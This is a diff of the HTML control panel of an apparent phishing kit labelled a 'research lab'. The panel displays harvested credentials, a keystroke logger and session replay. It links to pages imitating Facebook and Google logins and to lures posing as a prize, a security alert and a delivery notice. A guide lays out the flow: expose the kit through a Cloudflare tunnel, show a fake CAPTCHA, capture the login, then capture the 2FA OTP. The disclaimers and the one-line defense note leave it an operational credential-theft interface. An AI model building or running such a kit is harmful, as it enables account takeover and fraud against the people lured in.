@@ -3,154 +3,239 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 Phishing Research Lab - Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <title>Phishing Research Lab — Dashboard</title>
     <link rel="stylesheet" href="dashboard-style.css">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
 </head>
 <body>
-    <header class="header">
-        <div class="header-left">
-            <div class="logo">
-                <span class="logo-icon">🔬</span>
-                <div>
-                    <h1>Phishing Research Lab</h1>
-                    <span class="badge">EDUCATIONAL PURPOSE ONLY</span>
+    <div class="toast-container" id="toastContainer"></div>
+    <button class="mobile-toggle" onclick="toggleSidebar()"><i data-lucide="menu" class="icon-sm"></i></button>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-logo">
+            <div class="logo-icon"><i data-lucide="shield-check" class="icon-sm"></i></div>
+            <div>
+                <h1>Research Lab</h1>
+                <span class="ver">Security v3.0</span>
+            </div>
+        </div>
+        <nav class="sidebar-nav">
+            <div class="nav-label">Overview</div>
+            <div class="nav-item active" onclick="switchPage('overview',this)" id="nav-overview">
+                <span class="nav-icon"><i data-lucide="layout-dashboard"></i></span> Dashboard
+            </div>
+
+            <div class="nav-label">Collection</div>
+            <div class="nav-item" onclick="switchPage('data',this)" id="nav-data">
+                <span class="nav-icon"><i data-lucide="database"></i></span> Credentials
+                <span class="nav-badge" id="navBadgeData">0</span>
+            </div>
+            <div class="nav-item" onclick="switchPage('keylog',this)" id="nav-keylog">
+                <span class="nav-icon"><i data-lucide="keyboard"></i></span> Keylogger
+                <span class="nav-badge" id="navBadgeKeylog">0</span>
+            </div>
+            <div class="nav-item" onclick="switchPage('replay',this)" id="nav-replay">
+                <span class="nav-icon"><i data-lucide="video"></i></span> Session Replay
+            </div>
+
+            <div class="nav-label">Tools</div>
+            <div class="nav-item" onclick="switchPage('links',this)" id="nav-links">
+                <span class="nav-icon"><i data-lucide="link-2"></i></span> Phishing Links
+            </div>
+            <div class="nav-item" onclick="switchPage('guide',this)" id="nav-guide">
+                <span class="nav-icon"><i data-lucide="book-open"></i></span> Documentation
+            </div>
+        </nav>
+        <div class="sidebar-footer">
+            <div class="warn"><i data-lucide="alert-triangle" style="width:12px;height:12px;vertical-align:-2px"></i> RESEARCH USE ONLY</div>
+        </div>
+    </aside>
+
+    <!-- MAIN -->
+    <div class="main">
+        <header class="topbar">
+            <div class="topbar-title" id="pageTitle">Dashboard</div>
+            <div class="topbar-right">
+                <div class="ws-indicator">
+                    <div class="ws-dot" id="wsDot"></div>
+                    <span id="wsStatus">Connecting...</span>
                 </div>
+                <div class="server-status"><div class="dot"></div> Active</div>
             </div>
-        </div>
-        <div class="header-right">
-            <div class="status-dot"></div>
-            <span class="status-text">Server Active</span>
-        </div>
-    </header>
+        </header>
 
-    <div class="tunnel-banner" id="tunnelBanner">
-        <div class="tunnel-status" id="tunnelStatus">
-            <span class="tunnel-spinner"></span>
-            <span>Đang kết nối Cloudflare Tunnel...</span>
-        </div>
-    </div>
-
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-icon si-harvest">🎣</div>
-            <div class="stat-info">
-                <span class="stat-value" id="totalEntries">0</span>
-                <span class="stat-label">Credentials</span>
-            </div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-icon si-mobile">👁️</div>
-            <div class="stat-info">
-                <span class="stat-value" id="visitorCount">0</span>
-                <span class="stat-label">Truy cập</span>
-            </div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-icon si-desktop">📱</div>
-            <div class="stat-info">
-                <span class="stat-value" id="mobileCount">0</span>
-                <span class="stat-label">Mobile</span>
-            </div>
-        </div>
-        <div class="stat-card">
-            <div class="stat-icon si-key">⌨️</div>
-            <div class="stat-info">
-                <span class="stat-value" id="keystrokeCount">0</span>
-                <span class="stat-label">Keystrokes</span>
-            </div>
-        </div>
-    </div>
-
-    <div class="tab-nav">
-        <button class="tab-btn active" onclick="switchTab('data')">📋 Dữ liệu</button>
-        <button class="tab-btn" onclick="switchTab('links')">🔗 Links</button>
-        <button class="tab-btn" onclick="switchTab('keylog')">⌨️ Keylog</button>
-        <button class="tab-btn" onclick="switchTab('guide')">📖 Guide</button>
-    </div>
-
-    <!-- TAB: Dữ liệu (mặc định) -->
-    <div class="tab-content active" id="tab-data">
-        <div class="section">
-            <div class="section-header">
-                <h2 class="section-title">📋 Dữ liệu thu hoạch & Truy cập</h2>
-                <div class="section-actions">
-                    <button class="btn-refresh" onclick="loadAllData()">🔄 Mới</button>
-                    <button class="btn-export" onclick="exportData()">📥 Export</button>
-                    <button class="btn-danger" onclick="clearData()">🗑️ Xóa</button>
-                </div>
-            </div>
-            <p class="section-desc">Tất cả truy cập + credentials. Nhấn vào 1 dòng để xem chi tiết thiết bị.</p>
-            <div id="dataContainer" class="data-container">
-                <div class="empty-state">Chưa có dữ liệu...</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- TAB: Links -->
-    <div class="tab-content" id="tab-links">
-        <div class="section">
-            <h2 class="section-title">🔗 Link Phishing</h2>
-            <p class="section-desc">Khi Tunnel kết nối, link dưới đây hoạt động qua Internet</p>
-            <div class="links-grid">
-                <div class="link-card">
-                    <div class="link-header"><span class="link-icon">📘</span><span>Facebook</span></div>
-                    <div class="link-url" id="fbLink">/phishing/facebook.html</div>
-                    <div class="link-actions">
-                        <button class="btn-copy" onclick="copyLink('fbLink')">📋 Copy</button>
-                        <button class="btn-preview" onclick="window.open(document.getElementById('fbLink').textContent,'_blank')">👁️ Xem</button>
+        <div class="content">
+            <!-- PAGE: OVERVIEW -->
+            <div class="page active" id="page-overview">
+                <div class="tunnel-banner" id="tunnelBanner">
+                    <div class="tunnel-status" id="tunnelStatus">
+                        <span class="tunnel-spinner"></span>
+                        <span>Connecting to Cloudflare Tunnel...</span>
                     </div>
                 </div>
-                <div class="link-card">
-                    <div class="link-header"><span class="link-icon">📧</span><span>Google</span></div>
-                    <div class="link-url" id="ggLink">/phishing/google.html</div>
-                    <div class="link-actions">
-                        <button class="btn-copy" onclick="copyLink('ggLink')">📋 Copy</button>
-                        <button class="btn-preview" onclick="window.open(document.getElementById('ggLink').textContent,'_blank')">👁️ Xem</button>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon si-harvest"><i data-lucide="fish" class="icon-stat"></i></div>
+                        <div class="stat-info"><span class="stat-value" id="totalEntries">0</span><span class="stat-label">Credentials</span></div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon si-visit"><i data-lucide="eye" class="icon-stat"></i></div>
+                        <div class="stat-info"><span class="stat-value" id="visitorCount">0</span><span class="stat-label">Visitors</span></div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon si-mobile"><i data-lucide="smartphone" class="icon-stat"></i></div>
+                        <div class="stat-info"><span class="stat-value" id="mobileCount">0</span><span class="stat-label">Mobile</span></div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon si-key"><i data-lucide="keyboard" class="icon-stat"></i></div>
+                        <div class="stat-info"><span class="stat-value" id="keystrokeCount">0</span><span class="stat-label">Keystrokes</span></div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon si-replay"><i data-lucide="monitor-play" class="icon-stat"></i></div>
+                        <div class="stat-info"><span class="stat-value" id="replayCount">0</span><span class="stat-label">Replays</span></div>
+                    </div>
+                </div>
+
+                <div class="terminal-section">
+                    <div class="terminal-label"><span class="live">●</span> Live Activity Feed</div>
+                    <div class="live-terminal" id="liveTerminal">
+                        <div style="color:#9ca3af;font-family:'JetBrains Mono',monospace;font-size:11px;">Waiting for WebSocket connection...</div>
                     </div>
                 </div>
             </div>
-        </div>
-    </div>
 
-    <!-- TAB: Keylog -->
-    <div class="tab-content" id="tab-keylog">
-        <div class="section">
-            <div class="section-header">
-                <h2 class="section-title">⌨️ Keylogger</h2>
-                <div class="section-actions"><button class="btn-refresh" onclick="loadKeylog()">🔄 Mới</button></div>
-            </div>
-            <p class="section-desc">Ghi lại từng phím gõ, kể cả khi chưa bấm submit</p>
-            <div id="keylogContainer" class="keylog-container"><div class="empty-state">Chưa có keylog</div></div>
-        </div>
-    </div>
-
-    <!-- TAB: Guide -->
-    <div class="tab-content" id="tab-guide">
-        <div class="section">
-            <h2 class="section-title">📖 Hướng dẫn</h2>
-            <div class="guide-grid">
-                <div class="guide-card"><div class="guide-step">1</div><h3>Chạy Server</h3><p><code>npm start</code> → tự tạo Tunnel</p></div>
-                <div class="guide-card"><div class="guide-step">2</div><h3>Chờ Tunnel</h3><p>10-20s → link <code>*.trycloudflare.com</code></p></div>
-                <div class="guide-card"><div class="guide-step">3</div><h3>Copy Link</h3><p>Copy link phishing từ tab Links</p></div>
-                <div class="guide-card"><div class="guide-step">4</div><h3>Mở trên ĐT</h3><p>4G/WiFi khác đều OK!</p></div>
-                <div class="guide-card"><div class="guide-step">5</div><h3>Nhập thử</h3><p>Nhập email + pass giả trên ĐT</p></div>
-                <div class="guide-card"><div class="guide-step">6</div><h3>Xem kết quả</h3><p>Dashboard hiện dữ liệu realtime</p></div>
-            </div>
-            <div class="explanation-card">
-                <div class="flow-diagram">
-                    <div class="flow-step"><div class="flow-icon">📱</div><div class="flow-label">ĐT (4G)</div></div>
-                    <div class="flow-arrow">→</div>
-                    <div class="flow-step highlight"><div class="flow-icon">☁️</div><div class="flow-label">Cloudflare</div></div>
-                    <div class="flow-arrow">→</div>
-                    <div class="flow-step"><div class="flow-icon">💻</div><div class="flow-label">Laptop</div></div>
+            <!-- PAGE: DATA -->
+            <div class="page" id="page-data">
+                <div class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">Harvested Data</h2>
+                        <div class="section-actions">
+                            <button class="btn btn-ghost" onclick="loadAllData()"><i data-lucide="refresh-cw" class="icon-btn"></i> Reload</button>
+                            <button class="btn btn-ghost" onclick="exportData()"><i data-lucide="download" class="icon-btn"></i> Export</button>
+                            <button class="btn btn-danger" onclick="clearData()"><i data-lucide="trash-2" class="icon-btn"></i> Clear All</button>
+                        </div>
+                    </div>
+                    <p class="section-desc">All visits and captured credentials. Click a row to expand device details.</p>
+                    <div id="dataContainer" class="data-container">
+                        <div class="empty-state"><i data-lucide="inbox" style="width:32px;height:32px;margin-bottom:8px;opacity:.3"></i><br>No data collected yet</div>
+                    </div>
                 </div>
             </div>
+
+            <!-- PAGE: KEYLOG -->
+            <div class="page" id="page-keylog">
+                <div class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">Keystroke Logger</h2>
+                        <div class="section-actions"><button class="btn btn-ghost" onclick="loadKeylog()"><i data-lucide="refresh-cw" class="icon-btn"></i> Reload</button></div>
+                    </div>
+                    <p class="section-desc">Captures every keystroke in real-time, even before form submission.</p>
+                    <div id="keylogContainer" class="keylog-container"><div class="empty-state">No keystrokes recorded</div></div>
+                </div>
+            </div>
+
+            <!-- PAGE: REPLAY -->
+            <div class="page" id="page-replay">
+                <div class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">Session Replay</h2>
+                        <div class="section-actions"><button class="btn btn-ghost" onclick="loadReplay()"><i data-lucide="refresh-cw" class="icon-btn"></i> Reload</button></div>
+                    </div>
+                    <p class="section-desc">Behavioral analysis: mouse movement, scroll, hesitation time, click patterns.</p>
+                    <div id="replayContainer"><div class="empty-state">No session replay data yet</div></div>
+                </div>
+            </div>
+
+            <!-- PAGE: LINKS -->
+            <div class="page" id="page-links">
+                <div class="section">
+                    <h2 class="section-title">Phishing & Landing Pages</h2>
+                    <p class="section-desc">When Tunnel is connected, these links work over the Internet (no shared WiFi required)</p>
+                    <div class="links-grid">
+                        <div class="link-card">
+                            <div class="link-header"><i data-lucide="log-in" class="icon-link"></i> Facebook <span class="link-badge" style="background:var(--primary-muted);color:var(--primary)">PHISHING</span></div>
+                            <div class="link-url" id="fbLink">/phishing/facebook.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('fbLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('fbLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                        <div class="link-card">
+                            <div class="link-header"><i data-lucide="mail" class="icon-link"></i> Google <span class="link-badge" style="background:var(--primary-muted);color:var(--primary)">PHISHING</span></div>
+                            <div class="link-url" id="ggLink">/phishing/google.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('ggLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('ggLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                        <div class="link-card landing">
+                            <div class="link-header"><i data-lucide="gift" class="icon-link"></i> Prize Winner <span class="link-badge" style="background:rgba(217,119,6,.08);color:var(--amber)">LANDING</span></div>
+                            <div class="link-url" id="prizeLink">/landing/prize.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('prizeLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('prizeLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                        <div class="link-card landing">
+                            <div class="link-header"><i data-lucide="shield-alert" class="icon-link"></i> Security Alert <span class="link-badge" style="background:rgba(217,119,6,.08);color:var(--amber)">LANDING</span></div>
+                            <div class="link-url" id="secLink">/landing/security.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('secLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('secLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                        <div class="link-card landing">
+                            <div class="link-header"><i data-lucide="package" class="icon-link"></i> Delivery J&T <span class="link-badge" style="background:rgba(217,119,6,.08);color:var(--amber)">LANDING</span></div>
+                            <div class="link-url" id="delivLink">/landing/delivery.html</div>
+                            <div class="link-actions">
+                                <button class="btn-copy" onclick="copyLink('delivLink')"><i data-lucide="copy" class="icon-btn"></i> Copy</button>
+                                <button class="btn-preview" onclick="window.open(document.getElementById('delivLink').textContent,'_blank')"><i data-lucide="external-link" class="icon-btn"></i> Open</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE: GUIDE -->
+            <div class="page" id="page-guide">
+                <div class="section">
+                    <h2 class="section-title">Documentation</h2>
+                    <div class="guide-grid">
+                        <div class="guide-card"><div class="guide-step">1</div><h3>Start Server</h3><p><code>npm start</code> — auto WebSocket + Tunnel</p></div>
+                        <div class="guide-card"><div class="guide-step">2</div><h3>Wait for Tunnel</h3><p>10-20s → <code>*.trycloudflare.com</code></p></div>
+                        <div class="guide-card"><div class="guide-step">3</div><h3>Pick Scenario</h3><p>Landing page → redirect to phishing</p></div>
+                        <div class="guide-card"><div class="guide-step">4</div><h3>Open on Phone</h3><p>Works on 4G / any WiFi</p></div>
+                        <div class="guide-card"><div class="guide-step">5</div><h3>CAPTCHA → 2FA</h3><p>Fake CAPTCHA → OTP capture</p></div>
+                        <div class="guide-card"><div class="guide-step">6</div><h3>Monitor Live</h3><p>Dashboard updates in real-time</p></div>
+                    </div>
+                    <div class="explanation-card">
+                        <h3 style="font-size:13px;margin-bottom:10px;color:var(--text)">Attack Flow v3.0</h3>
+                        <div class="flow-diagram">
+                            <div class="flow-step"><div class="flow-icon"><i data-lucide="gift" style="width:20px;height:20px"></i></div><div class="flow-label">Landing<br>Page</div></div>
+                            <div class="flow-arrow"><i data-lucide="chevron-right" style="width:16px;height:16px"></i></div>
+                            <div class="flow-step"><div class="flow-icon"><i data-lucide="bot" style="width:20px;height:20px"></i></div><div class="flow-label">Fake<br>CAPTCHA</div></div>
+                            <div class="flow-arrow"><i data-lucide="chevron-right" style="width:16px;height:16px"></i></div>
+                            <div class="flow-step highlight"><div class="flow-icon"><i data-lucide="log-in" style="width:20px;height:20px"></i></div><div class="flow-label">Phishing<br>Login</div></div>
+                            <div class="flow-arrow"><i data-lucide="chevron-right" style="width:16px;height:16px"></i></div>
+                            <div class="flow-step"><div class="flow-icon"><i data-lucide="smartphone" style="width:20px;height:20px"></i></div><div class="flow-label">Fake<br>2FA OTP</div></div>
+                            <div class="flow-arrow"><i data-lucide="chevron-right" style="width:16px;height:16px"></i></div>
+                            <div class="flow-step"><div class="flow-icon"><i data-lucide="monitor-play" style="width:20px;height:20px"></i></div><div class="flow-label">Session<br>Replay</div></div>
+                        </div>
+                        <p style="font-size:11px;color:var(--text-dim);margin-top:12px;line-height:1.5">
+                            <strong style="color:var(--amber)">Defense:</strong> Use Password Manager (Bitwarden/1Password) to detect fake pages. Use FIDO2/Passkey to block OTP relay completely.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="warning-banner"><i data-lucide="alert-triangle" style="width:14px;height:14px;vertical-align:-2px"></i> <strong>WARNING:</strong> For security research only. Fraud is a criminal offense.</div>
         </div>
     </div>
-
-    <div class="warning-banner">⚠️ <strong>CẢNH BÁO:</strong> CHỈ dùng cho nghiên cứu bảo mật. Lừa đảo là vi phạm pháp luật.</div>
 
     <script src="dashboard-script.js"></script>
+    <script>lucide.createIcons();</script>
 </body>
 </html>
